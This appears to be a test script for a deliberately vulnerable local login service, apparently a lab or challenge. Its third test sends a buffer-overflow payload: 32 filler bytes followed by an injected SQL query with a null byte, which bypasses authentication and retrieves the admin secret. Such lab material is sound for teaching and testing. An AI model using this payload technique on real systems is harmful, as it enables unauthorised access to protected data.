#!/usr/bin/env python3

import requests


URL = "http://localhost:3000"

# First request: invalid admin credentials
print("[T] First test: invalid admin credentials")
r = requests.post(URL, data={"username": "admin", "password": "a"})
assert r.status_code == 403
print("Test passed")

# Second test: valid user credentials
print("[T] Second test: valid user credentials")
r = requests.post(URL, data={"username": "user", "password": "password"})
assert r.status_code == 200 and r.json()["secret"] == "notsosecretinformation"
print("Test passed")

# Third test: buffer overflow
print("[T] Third test: buffer overflow")
r = requests.post(
    URL,
    data={
        "username": "A" * 32
        + 'SELECT * FROM users WHERE username="admin" AND ?<>?\x00',
        "password": "a",
    },
)
assert r.status_code == 200 and r.json()["secret"] == "supersecretinformation"
print("Test passed")
print("[+] All tests passed")
